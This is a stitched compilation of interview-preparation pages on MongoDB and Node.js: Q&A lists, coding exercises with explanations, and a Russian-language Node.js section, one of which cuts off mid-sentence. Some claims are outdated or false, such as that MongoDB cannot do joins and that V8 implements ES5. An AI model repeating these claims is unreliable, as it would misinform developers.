Flexible data modeling: MongoDB allows for dynamic schema changes, making it easy to store and query data with varying structures.
Rich query language: MongoDB supports a powerful query language with features such as aggregation, indexing, and full-text search.
What is BSON?
BSON stands for Binary JSON, and it is a binary-encoded serialization format used by MongoDB to store data in a compact, efficient binary format. BSON is similar to JSON in terms of data types and structure, but it provides additional data types such as binary data, date, and ObjectId.

What is a replica set in MongoDB?
A replica set in MongoDB is a group of MongoDB servers that work together to provide high availability and data redundancy. It consists of a primary node that handles all write operations and one or more secondary nodes that replicate data from the primary node. If the primary node fails, one of the secondary nodes is automatically elected as the new primary, ensuring continuous availability of data.

Explain the concept of sharding in MongoDB.
Sharding is the process of distributing data across multiple MongoDB servers or shards to achieve horizontal scalability. Each shard contains a subset of the data, and the data is distributed based on a shard key. Sharding allows MongoDB to handle large amounts of data and high traffic loads by distributing the data across multiple servers.

What is the difference between a document and a collection in MongoDB?
In MongoDB, a document is a single record that represents data in a BSON format. It is similar to a row in a traditional relational database. A collection, on the other hand, is a group of related documents stored in MongoDB. It is similar to a table in a relational database.

How does MongoDB handle transactions?
Starting from MongoDB version 4.0, MongoDB supports multi-document transactions, allowing users to perform multiple operations on multiple documents in a transactional manner. MongoDB uses the two-phase commit (2PC) protocol to ensure the consistency and durability of data during transactions.

What is an index in MongoDB?
An index in MongoDB is a data structure that allows for efficient and fast retrieval of data based on the values of one or more fields in a collection. Indexes are used to speed up query performance by reducing the amount of data that needs to be scanned and filtered during query execution.

What are the different types of indexes in MongoDB?
MongoDB supports several types of indexes, including:

Single-field index: Indexes that are created on a single field.
Compound index: Indexes that are created on multiple fields.
Multi-key index: Indexes that are created on arrays to index the values of array elements.
Text index: Indexes that are used for text search operations.
GeoSpatial index: Indexes that are used for geospatial queries on data with coordinates.
How can you create an index in MongoDB?
In MongoDB, you can create an index using the createIndex() method or the ensureIndex() method. For example, to create a single-field index on a field called "name" in a collection called "users", you can use the following syntax:

db.users.createIndex({ name: 1 })

This will create an ascending index on the "name" field in the "users" collection. The number "1" specifies the ascending order, while "-1" specifies descending order.

What is GridFS in MongoDB?
GridFS is a specification for storing large files, such as images, audio files, and videos, in MongoDB. It uses a combination of two collections: "files" and "chunks". The "files" collection stores metadata about the files, while the "chunks" collection stores the actual binary data of the files in small chunks.

How can you perform aggregation in MongoDB?
Aggregation in MongoDB is the process of processing and transforming data using various operations such as grouping, filtering, sorting, and calculating aggregate functions. MongoDB provides an aggregation framework that allows you to perform aggregation using the aggregate() method. For example, you can use the following syntax to group documents by a field called "category" and calculate the average of the "price" field:

db.products.aggregate([
   { $group: { _id: "$category", avgPrice: { $avg: "$price" } } }
])

This will group documents in the "products" collection by the "category" field and calculate the average of the "price" field for each category.

What is the difference between find() and findOne() in MongoDB?
find() and findOne() are two methods used to query data in MongoDB. The main difference is that find() returns a cursor, which is a pointer to the result set, while findOne() returns a single document that matches the query criteria.

What is a covered query in MongoDB?
A covered query in MongoDB is a query where all the fields required by the query are covered by an index. This means that MongoDB can fulfill the query without having to load the actual documents from the collection, resulting in faster query performance.

How can you perform backups and restores in MongoDB?
MongoDB provides several methods for performing backups and restores, including:

mongodump: A command-line tool that creates a binary dump of the data in a MongoDB database.
mongorestore: A command-line tool that restores data from a binary dump created by mongodump.
MongoDB Atlas: A managed MongoDB service that provides automated backups and restores.
Filesystem snapshots: Backing up the underlying storage system where MongoDB data is stored.
How can you perform data modeling in MongoDB?
Data modeling in MongoDB involves designing the structure of documents and collections to efficiently store and query data. Some best practices for data modeling in MongoDB include denormalizing data, embedding related data in the same document, using appropriate data types, and designing indexes based on query patterns and performance requirements.

What is the TTL index in MongoDB?
The TTL (Time-To-Live) index in MongoDB is a special type of index that allows you to automatically expire documents from a collection after a certain amount of time. This is useful for storing data that has a limited lifespan, such as temporary data or session data. You can create a TTL index by specifying an expiration field and the desired time-to-live in seconds when creating the index.

What is a cursor in MongoDB?
A cursor in MongoDB is a pointer to the result set of a query. When you perform a query using methods like find(), MongoDB returns a cursor that you can use to iterate over the results or fetch a subset of the results. Cursors are used to efficiently retrieve large result sets and minimize memory usage.

What is the role of the "ObjectId" in MongoDB?
The "ObjectId" is a built-in data type in MongoDB that is used as the default primary key for documents in a collection. It is a 12-byte value that consists of a timestamp, a unique machine identifier, a process identifier, and a counter. The "ObjectId" is automatically generated by MongoDB when a document is inserted into a collection and can be used to uniquely identify documents within a collection. It is often used as a unique identifier in the "_id" field of MongoDB documents.

What is horizontal scaling in MongoDB?
Horizontal scaling in MongoDB refers to the ability to distribute data across multiple nodes or servers in a cluster. It allows for increased storage capacity, processing power, and high availability of data. MongoDB achieves horizontal scaling through techniques such as sharding, which partitions data across multiple shards, and replica sets, which maintain multiple copies of data across different nodes.

How can you perform a join in MongoDB?
MongoDB does not support joins like traditional relational databases. Instead, data can be denormalized by embedding related data within the same document or by using application-level joins. This means that data that would typically be stored in separate tables in a relational database can be stored in a single document or across multiple documents in MongoDB. This approach avoids the need for expensive join operations and can result in faster query performance.

What is the "findAndModify" command in MongoDB?
The "findAndModify" command in MongoDB is a powerful command that allows you to atomically modify and return a document in a single operation. It can be used to update a document and retrieve the updated document in a single request. The "findAndModify" command takes a query to specify the document to be modified, an update operation to specify the changes to be made, and optional parameters to specify options such as sorting and returning the original document.

What is the role of the "mongod" process in MongoDB?
The "mongod" process in MongoDB is the primary daemon process that runs the MongoDB server. It is responsible for managing all aspects of the MongoDB server, including handling client connections, processing queries, managing storage, and handling replication and sharding in a distributed environment. The "mongod" process is the core component of the MongoDB server and is responsible for storing and managing the data.

What is the "NoSQL" approach in MongoDB?
MongoDB is a NoSQL database, which means that it does not follow the traditional relational database model. Instead of using tables with fixed schemas, MongoDB uses flexible, JSON-like documents to store data. This allows for dynamic and schema-less data structures, making it easy to store, retrieve, and update data in a flexible and scalable manner. The NoSQL approach in MongoDB provides greater agility, scalability, and performance for handling large and complex datasets.

How can you secure MongoDB?
Securing MongoDB involves implementing various security measures to protect the data and ensure the integrity of the system. Some best practices for securing MongoDB include:

Enabling authentication to require username and password for accessing MongoDB.
Configuring authorization to control access to databases and collections.
Encrypting data in transit using SSL/TLS.
Restricting network access through firewalls and network settings.
Regularly applying patches and updates to MongoDB to address security vulnerabilities.
Enabling auditing to monitor and track database activity.
Using role-based access control (RBAC) to restrict permissions based on user roles.
Properly configuring and securing MongoDB deployment in a production environment.

Node Js Interview Questions

Node Js Coding Questions and Answers
This article provides Node js coding questions and answers to help you better understand the basics of Node.js development. Get the answers you need to master Node.js coding and take your development skills to the next level.
Apr 14, 2023 - 14:09Updated: Apr 15, 2023 - 00:280
 Facebook  Twitter      
Node Js Coding Questions and Answersnode js coding interview questions and answer



Reverse a string:
Write a function to reverse a given string in Node.js.

function reverseString(str) {
    return str.split('').reverse().join('');
}

Explanation: The reverseString function takes a string as input. It uses split('') to convert the string into an array of characters, then uses reverse() to reverse the order of the array, and finally uses join('') to convert the array back to a string with reversed characters.

Find the first non-repeated character:
Write a function to find the first non-repeated character in a given string in Node.js.

function findFirstNonRepeatedChar(str) {
    let charCount = {};
    for (let char of str) {
        charCount[char] = (charCount[char] || 0) + 1;
    }
    for (let char of str) {
        if (charCount[char] === 1) {
            return char;
        }
        }
    return null;
}

Explanation:
The findFirstNonRepeatedChar function uses an object charCount to keep track of the count of each character in the input string. It then iterates through the string twice. First, it counts the occurrences of each character and stores them in charCount. Second, it finds the first character with a count of 1 in charCount and returns it as the first non-repeated character.

Implement a stack:
Implement a stack (LIFO) data structure in Node.js with push, pop, and peek operations.

class Stack {
   constructor() {
      this.items = [];
   }
   push(item) {
      this.items.push(item);
   }
   pop() {
      if (!this.isEmpty()) {
         return this.items.pop();
      }
   return null;
   }
   peek() {
      if (!this.isEmpty()) {
         return this.items[this.items.length - 1];
      }
   return null;
   }
   isEmpty() {
   return this.items.length === 0;
   }
}

Explanation:
The Stack class uses an array items to store the elements in the stack. It has push to add an item to the top of the stack, pop to remove and return the top item, peek to return the top item without removing it, and isEmpty to check if the stack is empty.

Find the sum of two numbers in a sorted array:
Given a sorted array of integers, write a function to find two numbers that sum up to a target number in Node.js.

function findSumInSortedArray(arr, target) {    let left = 0;
   let right = arr.length - 1;
   while (left < right) {
      let sum = arr[left] + arr[right];
      if (sum === target) {
         return [arr[left], arr[right]];
      } else if (sum < target) {
         left++;
      } else {
         right--;
      }
      }
   return null;
}

Explanation:
The findSumInSortedArray function uses a two-pointer approach with left and right pointers initially pointing to the start and end of the sorted array, respectively. It calculates the sum of the numbers at the left and right pointers, and compares it with the target sum. If the sum is equal to the target, it returns the numbers at left and right as the result. If the sum is less than the target, it moves the left pointer to the right to increase the sum, and if the sum is greater than the target, it moves the right pointer to the left to decrease the sum. This process continues until a pair of numbers with the target sum is found or the pointers meet, in which case it returns null to indicate that no such pair was found.

Check if a binary tree is a valid BST:
Given a binary tree, write a function to determine if it is a valid binary search tree (BST) in Node.js.

class TreeNode {
   constructor(val) {
      this.val = val;
      this.left = null;
      this.right = null;
   }
}

function isValidBST(root) {
   return checkBST(root, null, null);
}

function checkBST(node, min, max) {
   if (node === null) {
      return true;
   }
   if ((min !== null && node.val <= min) || (max !== null && node.val >= max)) {
      return false;
   }
   return checkBST(node.left, min, node.val) && checkBST(node.right, node.val, max);
}

Explanation: The isValidBST function takes the root of a binary tree as input and calls the checkBST helper function to recursively check if each node in the tree satisfies the conditions of a valid BST. The checkBST function takes a node, along with a min and a max value, to represent the allowed range of values for that node. It returns true if the node is null (i.e., an empty tree is considered a valid BST), or if the node's value is within the allowed range and both its left and right subtrees are valid BSTs.

Find the longest increasing subarray:
Given an array of integers, write a function to find the length of the longest increasing subarray in Node.js.

function findLongestIncreasingSubarray(arr) {
   let maxLength = 0;
   let currentLength = 0;
   for (let i = 0; i < arr.length; i++) {
      if (arr[i] < arr[i + 1]) {
         currentLength++;
      } else {
      maxLength = Math.max(maxLength, currentLength + 1);
         currentLength = 0;
      }
   }
   return maxLength;
}

Explanation:
The findLongestIncreasingSubarray function iterates through the input array arr and keeps track of the current length of the increasing subarray using the currentLength variable. When a number in the array is smaller than the next number, it increases currentLength by 1. When a number in the array is not smaller than the next number, it updates the maxLength with the maximum value between maxLength and currentLength + 1, and resets currentLength to 0. Finally, it returns the maxLength which represents the length of the longest increasing subarray.

Find the median of two sorted arrays:
Given two sorted arrays, write a function to find the median element in Node.js.

function findMedianSortedArrays(nums1, nums2) {
   let merged = [];
   let i = 0;
   let j = 0;
   while (i < nums1.length && j < nums2.length) {
      if (nums1[i] < nums2[j]) {
         merged.push(nums1[i++]);
      } else {
         merged.push(nums2[j++]);
      }
   }
   while (i < nums1.length) {
      merged.push(nums1[i++]);
   }
   while (j < nums2.length) {
      merged.push(nums2[j++]);
   }
   const len = merged.length;
   if (len % 2 === 0) {
      // If the merged array has even length, return the average of the middle two elements
      const mid1 = len / 2 - 1;
      const mid2 = len / 2;
      return (merged[mid1] + merged[mid2]) / 2;
   } else {
      // If the merged array has odd length, return the middle element
      const mid = Math.floor(len / 2);
      return merged[mid];
   }
}

Explanation:
The `findMedianSortedArrays` function takes two sorted arrays, `nums1` and `nums2`, as input and merges them into a single sorted array called `merged`. It uses two pointers, `i` and `j`, to traverse `nums1` and `nums2` respectively, comparing elements at each step and pushing the smaller one into `merged`. After the merging process is complete, it calculates the median based on the length of the merged array. If the length is even, it returns the average of the middle two elements. If the length is odd, it returns the middle element.




Serialize and deserialize a binary tree:
Given a binary tree, write functions to serialize and deserialize it in Node.js.

class TreeNode {
   constructor(val) {
      this.val = val;
      this.left = null;
      this.right = null;
   }
}

function serialize(root) {
   if (root === null) {
      return 'null';
   }
   const left = serialize(root.left);
   const right = serialize(root.right);
   return `${root.val},${left},${right}`;
}

function deserialize(data) {
   const nodes = data.split(',');
   return buildTree(nodes);

   function buildTree(nodes) {
      const val = nodes.shift();
      if (val === 'null') {
         return null;
      }
      const node = new TreeNode(parseInt(val));
      node.left = buildTree(nodes);
      node.right = buildTree(nodes);
      return node;
   }
}

Explanation:
The serialize function takes the root of a binary tree as input and serializes it into a comma-separated string representation. It recursively traverses the tree in a pre-order manner, appending the values of each node, along with the serialized left and right subtrees, to the result string.
The deserialize function takes a serialized string representation of a binary tree as input and deserializes it back into a binary tree object. It does so by splitting the input string into an array of values, and then recursively building the tree from the values using a helper function called buildTree. The buildTree function takes the array of values as input, and for each value, it creates a new node with that value, recursively builds its left and right subtrees, and returns the constructed node.

Merge Intervals:
Given an array of intervals, write a function to merge overlapping intervals in Node.js.

class Interval {
   constructor(start, end) {
      this.start = start;
      this.end = end;
   }
}

function mergeIntervals(intervals) {
   if (intervals.length <= 1) {
      return intervals;
   }

   intervals.sort((a, b) => a.start - b.start);

   const mergedIntervals = [];
   let currentInterval = intervals[0];

   for (let i = 1; i < intervals.length; i++) {
      if (intervals[i].start <= currentInterval.end) {
         currentInterval.end = Math.max(currentInterval.end, intervals[i].end);
      } else {
         mergedIntervals.push(currentInterval);
         currentInterval = intervals[i];
      }
   }
   mergedIntervals.push(currentInterval);
   return mergedIntervals;
}

Explanation:
The `mergeIntervals` function takes an array of `Interval` objects as input, where each `Interval` object represents an interval with a start and end time. It first checks if the input array has only one interval or is empty, in which case it directly returns the input array as is.
Next, it sorts the intervals based on their start times in ascending order. It then initializes an empty array called `mergedIntervals` to store the merged intervals. It also initializes a `currentInterval` variable to keep track of the interval being currently merged, starting with the first interval in the sorted array.
The function then iterates through the remaining intervals in the sorted array. For each interval, it checks if it overlaps with the current interval being merged. If it does, it updates the end time of the current interval being merged to be the maximum of the end times of both overlapping intervals. If it does not overlap, it pushes the current interval being merged into the `mergedIntervals` array and sets the current interval being merged to be the current interval in the sorted array.
After the loop, the last remaining interval being merged is pushed into the `mergedIntervals` array, and the final merged intervals are returned.

          

   Implement LRU Cache:
Write a class for a Least Recently Used (LRU) Cache in Node.js.

class LRUCache {
   constructor(capacity) {
      this.capacity = capacity;
      this.cache = new Map();
   }

   get(key) {
      if (this.cache.has(key)) {
         const value = this.cache.get(key);
         // Move the accessed key-value pair to the end to mark it as most recently used
         this.cache.delete(key);
         this.cache.set(key, value);
         return value;
      }
      return -1;
   }

   put(key, value) {
      if (this.cache.has(key)) {
         // If key already exists, update the value and move it to the end
         this.cache.delete(key);
      } else if (this.cache.size >= this.capacity) {
         // If cache is full, remove the least recently used key-value pair from the beginning
         const oldestKey = this.cache.keys().next().value;
         this.cache.delete(oldestKey);
      }
      // Add the new key-value pair to the end of the cache
      this.cache.set(key, value);
   }
}

Explanation:
The LRUCache class implements a Least Recently Used (LRU) cache using a combination of a Map and an internal capacity variable. The capacity parameter passed to the constructor determines the maximum number of key-value pairs that the cache can hold.
The class has two main methods, get and put, which implement the basic operations of a cache: retrieving a value by key, and adding or updating a key-value pair.
The get method first checks if the key exists in the cache. If it does, it returns the corresponding value and moves the accessed key-value pair to the end of the Map to mark it as the most recently used. If the key does not exist, it returns -1 to indicate that the key is not in the cache.
The put method first checks if the key already exists in the cache. If it does, it updates the value and moves the key-value pair to the end of the Map to mark it as the most recently used. If the key does not exist and the cache is already at its capacity, it removes the least recently used key-value pair from the beginning of the Map. Finally, it adds the new key-value pair

21 вопрос по Node.js с ответами
21 вопрос по Node.js с ответами, изображение №1
Node.js используется не только в серверной части. Он также применяется для создания интерфейсных приложений, и это стало очень важной частью экосистемы веб-разработки. Это означает, что разработчику, использующему Node.js, очень полезно знать роль, которую эта технология играет в различных JavaScript- средах. По этой причине я включил в данное руководство несколько вопросов и ответов в этом направлении.

Общие указания
Я бы рекомендовал попытаться ответить на вопросы самостоятельно, прежде чем читать ответы.

Вопросы по Node.js
Что такое Node.js?
Node.js — это среда выполнения JavaScript, основанная на движке V8. Она позволяет запускать JavaScript вне браузера — обычно на веб-сервере.

Для чего нужен Node.js?
Node.js отлично справляется с обработкой нескольких соединений с низкой цикломатической сложностью, учитывая, что его однопоточный характер требует, чтобы мы как можно скорее освободили цикл обработки событий. Это делает Node.js идеальным выбором для микросервисов и приложений, работающих в режиме реального времени.

Что такое npm?
npm представляет собой диспетчер пакетов Node.js. Он состоит из интерфейса командной строки, который можно использовать для доступа к онлайн-реестру общедоступных и частных пакетов.

Как создать приложение Node.js с нуля?
Можно начать с создания папки проекта. Затем мы переходим к этой папке с помощью командной строки и запускаем npm init. Наконец, мы следуем инструкциям, чтобы заполнить информацию о нашем приложении.

Что делает «npm install»?
Он устанавливает зависимости, найденные в файле package.json.

Как установить библиотеку в Node.js?
npm install name-of-the-library установит нашу библиотеку и включит ее как dependency. Если мы добавим параметр --save-dev, библиотека будет включена как devDependency.

Как создать собственный скрипт?
Необходимо зайти в package.json и добавить собственный скрипт в поле scripts. Затем можно запустить скрипт, перейдя в терминал и запустив npm run name-of-script.

Можно ли создать интерфейсное приложение с помощью Node.js?
Браузер не может запускать приложение, созданное на основе Node.js, но можно использовать что-то вроде webpack или Parcel, чтобы связать код и превратить его во что-то, что может запускать браузер. В настоящее время очень распространено использование среды Node.js для создания интерфейсных приложений. Хорошим примером использования Node.js во внешнем интерфейсе является платформа Electron, которая использует как Node.js, так и chromium для сборки «нативных» приложений, например, таких как VS Code.

Можете ли вы назвать три популярных фреймворка Node.js?
Express.js, вероятно, является наиболее популярным фреймворком на сегодняшний день. Koajs, вероятно, один из наиболее быстрых, а Sails.js отлично подходит для приложений двусторонней привязки в реальном времени, поскольку они используют socket.io.

Чем хорош Express.js?
Express.js упрощает установку маршрутов для веб-приложения, что делает его оптимальным выбором для создания REST API. Он довольно гибкий и простой в использовании, а его архитектура промежуточного программного обеспечения помогает сохранить простую и масштабируемую систему.

Что такое Crypto?
Crypto — это внутренняя библиотека Node.js, которая обеспечивает криптографические функции, например, для шифрования и дешифрования паролей.

Как мы обрабатываем локальную и глобальную область видимости в Node.js?
В отличие от клиентского JavaScript, в Node.js переменные, объявленные с помощью var с максимальной областью видимости, не являются глобальными; они являются локальными по отношению к модулю, в котором находятся. В браузере у нас есть доступ к объекту window, в котором находятся глобальные переменные, и в Node.js есть объект для этого, называемый global.

Есть ли у Node.js доступ к файловой системе?
Да. Мы можем использовать модуль fs для чтения, записи, копирования и удаления файлов и папок.

Что означает неблокирующий?
Это означает, что фрагмент кода, такой как, например, асинхронная функция, планируется запустить в следующей итерации цикла обработки событий, тем самым разблокируя остальную часть кода и, позволяя ему продолжать работать.

Что такое цикл событий и как он работает?
Цикл событий — это то, что придает Node.js асинхронность. Он планирует выполнение набора из пяти фаз в цикле. На первом этапе выполняются запланированные обратные вызовы setTimeout и setInterval. Второй запускает обратные вызовы ввода-вывода, запланированные для выполнения на текущей итерации. Третий опрашивает события, которые будут выполнены в следующей итерации. Четвертый запускает обратные вызовы setImmediate(). Наконец, пятый запускает все обратные вызовы «закрытия».

Выполняются ли асинхронные функции параллельно?
Нет. Асинхронная функция будет выполняться на следующей итерации цикла событий, в то время как параллельный процесс выполняется в своем собственном потоке.

Является ли Node.js многопоточным?
Процесс Node.js выполняется в одном потоке, но при необходимости можно использовать модуль child_process для параллельного запуска нескольких процессов или Workers для запуска нескольких потоков.

Что такое модуль child_process?
Модуль child_process позволяет порождать и разветвлять дочерние процессы. Это независимые процессы, которые выполняются в собственном процессоре и предоставляют нам доступ к системным командам.

В чем разница между web worker и рабочим потоком?
Web worker реализованы в браузере, а рабочие потоки реализованы в Node.js. Они решают одну и ту же проблему, а именно обеспечивают параллельную обработку. Фактически, API Worker Thread основан на реализации Web Workers.

Каковы преимущества использования рабочего потока перед дочерним процессом?
В то время как дочерний процесс запускает свой собственный процесс со своим собственным пространством памяти, рабочий поток — это поток внутри процесса, который может использовать память совместно с основным потоком. Это помогает избежать дорогостоящей сериализации данных.

Что бы вы использовали для открытия двустороннего соединения с клиентом через HTTP в реальном времени?
Мы могли бы использовать WebSockets или длинный поллинг. Существуют библиотеки, такие как soket.io и SignalR, которые упрощают нашу задачу. Они даже предоставляют клиенты, которые возвращаются к длинному поллингу, если WebSockets недоступны в браузере.

Top 80+ NodeJS Interview Questions for Fresher & Senior Developer
 17 Jul 2025
 Question
 22.9K Views
 63 min read

Learn with an interactive course and practical hands-on labs
Free Node.js Course with Certification for Beginners [2025]
Going for a Node.js interview can feel exciting but also a little tricky. To do well, you should know the Node.js interview questions that are often asked. You need to understand how Node.js handles tasks, why it is fast, and how it works with JavaScript. Also, be ready for Node.js coding interview questions, where you might have to write simple code.

In this Node.js Tutorial, Interviewers don’t just look for memorized answers. They want to see if you truly understand the topic. That’s why practicing Node.js interview questions and going through Node.js interview questions and answers will help. With good preparation, you can feel confident and increase your chances of getting the job!

Top Node.js Interview Questions and Answers for Beginners
1. What is Node.js?
Node.js is a server-side JavaScript environment for developing web applications like ASP.NET, JSP, PHP, etc. It is an open-source and cross-platform framework based on Google's V8 JavaScript Engine.

What is Node.js?
2. Why do we use Node.js?
Fast and lightweight – Node.js runs quickly and uses fewer resources.
Handles many users – It can manage multiple requests at the same time without slowing down.
Uses JavaScript – Developers can use the same language for both front-end and back-end.
Great for real-time apps – Works well for chat apps, online games, and live updates.
Good for APIs – It handles requests quickly, making it perfect for web APIs.
Scalable and robust – Many big companies use it to build large applications.
Read More: Brief History of Node.js and io.js

3. What is the Node.js foundation?
The Node.js Foundation is an independent foundationthat develops and releases Node.js. Its developers come fromIBM,Microsoft,PayPal,Joyent,Fidelity,SAP, and other companies. On September 14, 2015, the Node.js Foundation announced the combined release of Node.js and io.js into a single code base known as Node.js version 4.0. It includes many features of Node.js and io.js, including manynew features of ES6.

4. Where do we use Node.js?
We use Node.js in many areas because it is fast and handles multiple tasks at once. Here are some common uses:

Web Applications – Used to build fast and scalable websites.
Real-time Apps – Perfect for chat applications, live updates, and online gaming.
APIs and Backend Services – Helps create web APIs to connect databases and front-end apps.
Streaming Services – Used for video and audio streaming, like Netflix.
Microservices – Helps break large applications into smaller, manageable parts.
IoT (Internet of Things) – Supports smart devices and real-time data processing.
5. Describe how Node.js works.
Node.js works in a unique way that makes it fast and efficient. It can handle many tasks at the same time without waiting for one to finish. Here’s how it works step by step:

Receives a Request – When a user makes a request (like opening a webpage or fetching data), Node.js receives it.
Checks the Task Type – It looks at what kind of task it is (e.g., reading a file, connecting to a database, or running code).
Handles Simple Tasks Immediately – If the task is simple, like basic calculations, Node.js processes it quickly and sends the result.
Sends Complex Tasks to the System – If the task is complex, like reading a file or fetching data from a database, Node.js sends it to the system to handle.
Keeps Working on Other Requests – While waiting for the complex task to complete, Node.js does not stop. It continues working on other tasks.
Uses Callback Function – Once the complex task is done, Node.js uses a callback function to return the result to the user.
Working of Node.js

This non-blocking and event-driven process makes Node.js fast and efficient for web applications, APIs, and real-time apps.

6. What is the V8 JavaScript Engine?
V8 is an open-source JavaScript engine developed by Google in 2008 to be used in the Chrome browser. It is written in C++ language and implements ES5.

V8 JavaScript Engine
Key Points About the V8 JavaScript Engine

It can be run standalone or can be embedded into any C++ application.
It uses just-in-time compilation (JIT) to execute JavaScript code.
It compiles JavaScript to native machine code (IA-32, x86-64, ARM, or MIPS ISAs) before execution.
It is used by many open-source projects like Node.js and MongoDB to execute JavaScript on the server side
7. What IDEs can you use for Node.js development?
Node.JS development can be done with the help of the following IDEs:

Visual Studio 2013, 2015, or higher
Visual Studio Code
Atom
Node Eclipse
WebStorm
Sublime Text
8. What platforms does Node.js support?
Node.js supports the following platforms:

Linux
Windows
Max OS X
SunOS
9. Where can you deploy the Node.js web application?
The easiest way to deploy your Node.js web application is by using Cloud server hosting like Windows Azure, Aws, Google, Heroku, etc.

10. What are the advantages of using promises instead of callbacks?
Using promises in Node.js is better than callbacks in many ways. This is a common topic in Node.js interview questions and advanced Node.js interview questions.

Easier to Read – Promises make the code cleaner and more organized, avoiding "callback hell."
Better Error Handling – Uses .catch() to handle errors easily, unlike multiple error checks in callbacks.
Supports Chaining – Allows multiple tasks to run one after another using .then().
Works with Async/Await – Makes asynchronous code look simple and readable.
More Efficient – Improves code structure and debugging, which is useful in Node.js coding interview questions.
Understanding these points will help you answer Node.js interview questions and answers confidently!

11. Define the term I/O.
I/O stands for Input/Output in computing. It means how a computer or program takes data (input) and gives back results (output), like reading a file or displaying something on a screen.

12. What are the differences between front-end and back-end development?
The differences between front-end and back-end development are:

Factors	Front-end Development	Back-end development
Definition	Works on the part of a website or app that users see and interact with.	Manages the server, database, and logic behind the website or app.
Languages Used	HTML, CSS, JavaScript (React, Angular, Vue)	JavaScript (Node.js), Python, PHP, Java, Ruby
Main Focus	Designing and creating a smooth user experience.	Handling data, security, and server-side logic.
Interaction	Directly interacts with users.	Works behind the scenes and interacts with databases, APIs, and frontend.
Examples	Buttons, forms, navigation menus, animations.	User authentication, data processing, storing information in databases.
13. Describe the modules in Node.js.
Modules in Node.js are small parts of code that help keep programs organized. They make it easy to reuse code and manage different features. There are three types of modules:

Core Modules – Built-in modules like fs (file handling), http (server), and path (file paths).
Local Modules – Custom modules created by developers to organize their code better.
Third-Party Modules – Extra modules installed using npm, like express for web servers.
Modules make Node.js applications easier to build and manage!

14. Describe the purpose of the module.Exports in Node.js.
We use module.exports in Node.js to share functions, objects, or variables between files. It helps keep code organized, reusable, and easy to manage in large applications.

15. Why is Node.js chosen over backend technologies like Java and PHP?
Node.js is preferred because it is faster, lightweight, and highly scalable compared to Java and PHP. It uses non-blocking I/O, which allows handling multiple requests at once without slowing down.

Unlike Java and PHP, Node.js uses JavaScript for both the front and back end, making development easier. It is also great for real-time applications, like chat apps and online streaming, where speed and performance matter the most.

16. What is callback?
A callback is a function passed as an argument to an asynchronous function that describes what to do after the asynchronous operation has been completed. Callbacks are used frequently in Node.js development.

 var fs = require('fs');
 //callback function to read file data
 fs.readFile('text.txt', 'utf8', function (err, data) { //callback function
 console.log(data);
 });
17. What is a Module?
A module is a collection of JavaScript code that encapsulates related code into a single unit of code. Node.js has a simple module loading system. A developer can load a JavaScript library or module into his program by using the required method as given below:

 var HTTP = require('HTTP');   
Read More: Exploring Node.js Core Modules

18. What are the advantages and disadvantages of Node.js?
The advantages and disadvantages of Node.js are:

Advantages of Using Node.js
Fast and Efficient – Uses non-blocking I/O, making it quick for handling multiple requests.
Scalable – Supports real-time applications like chat apps and online gaming.
Same Language for Frontend & Backend – Uses JavaScript for both, making development easier.
Large Community Support – Many libraries and tools are available for faster development.
Works Well with Cloud – It is easily deployable on cloud platforms like AWS and Heroku.
Disadvantages of Using Node.js
Not Ideal for CPU-heavy tasks – Single-threaded nature struggles with complex computations.
Asynchronous Complexity – Requires proper understanding of callbacks, promises, and async/await.
Unstable Third-Party Modules – Some npm packages may lack proper updates or documentation.
Security Risks – Open-source modules can sometimes have vulnerabilities.
Memory Usage – Can consume more RAM compared to other backend technologies.
Node.js is great for fast and scalable applications but may not be the best for heavy processing tasks.

19. What command is used to load external libraries in Node.js?
The command used to load external libraries in Node.js is require(). It allows importing modules like Express.js, Mongoose, or Lodash for use in a Node.js application.

Example
   const express = require('express');
Node.js Interview Questions and Answers for Intermediate
Let's discuss the most important Node.js interview questions and answers for intermediate.

20. What is a REPL Terminal?
REPL stands for Read-Eval-Print-Loop. It is an interface to run your JavaScript code and see the results. You can access REPL by simply running a node.js command prompt and simply running the command node.

REPL(Read Eval Print Loop) Terminal
Here, we are adding two numbers, 1 and 2, which results in 3.

21. What do you understand about event-driven programming?
Event-driven programming in Node.js means the program waits for events like user actions, data requests, or messages and responds when they happen. This makes Node.js applications fast, efficient, and great for real-time applications like chat apps and live updates.

22. Describe the differences between process.nextTick() and setImmediate().
The differences between process.nextTick() and setImmediate() are:

Factor	rocess.nextTick()	setImmediate()
Execution Timing	Runs immediately after the current operation completes, before I/O events.	Runs after the current I/O cycle but before the next event loop starts.
Priority	Has higher priority, executes before I/O tasks.	Executes in the next event loop cycle, after I/O tasks.
Use Case	Useful for urgent tasks that must run before the event loop continues.	Best for non-urgent tasks that can wait until the next cycle.
Blocking Issue	Overuse may block the event loop and delay I/O operations.	Doesn't block the loop, allowing smoother execution.
Example Use	Handling errors or running quick callbacks before moving to the event loop.	Executing tasks after completing I/O operations.
23. What is the difference between Package dependencies and development dependencies?
Package dependencies and development dependencies are both defined in the package.json file.

Package Dependencies
The dependencies field of the package.json file will have all packages listed on which your node project is dependent.

"dependencies": {
 "angular": "1.4.8",
 "jQuery": "^2.1.4"
 }
To do a listing of your node module as a dependencies package you need to use either the –save flag or –production flag with the node command to install the package.

Development Dependencies
The devDependencies field of the package.json file will have those packages listing which is only required for testing and development.

 "devDependencies": {
 "mocha": " ~1.8.1"
 }
To do a listing of your node module as a dependencies package you need to use –dev flag with the node command to install the package.

24. What are buffers?
JavaScript language has no mechanism for reading or manipulating streams of binary data.
So, Node.js introduced the Buffer class to deal with binary data.
In this way, Buffer is a Node.js special data type to work with binary data.
A buffer length is specified in bytes.
By default, buffers are returned in data events by all Stream classes.
Buffers are very fast and light objects as compared to strings.
A buffer acts like an array of integers but cannot be resized.
25. What are Streams?
Typically, a Stream is a mechanism for transferring data between two points. Node.js provides you with streams to read data from the source or to write data to the destination. In Node.js, Streams can be readable, writable, or both and all streams are instances of the EventEmitter class.

var http = require('http'); 
 var server = http.createServer(function (req, res) {
 // here, req is a readable stream
 // here, res is a writable stream
 });  
26. How do you debug the code in Node.js?
Static languages like C# and Java have tools like Visual Studio and Eclipse, respectively, for debugging. Node.js is based on JavaScript, and in order to debug your JavaScript code, we have console.log() and alert() statements. But Node.js supports other options as well for code debugging. It supports the following options:

The Built-In Debugger: A non-GUI tool to debug the Node.js code.
Node Inspector: A GUI tool to debug the Node.js code with the help of Chrome or Opera browser.
IDE Debuggers: IDEs like WebStorm, Visual Studio Code, Eclipse IDE, etc., support the Node.js code debugging environment.
27. What are the uses of the path module in Node.js?
Node.js provides a path module to normalize, join, and resolve file system paths. It is also used to find relative paths, extract components from paths, and determine the existence of paths.

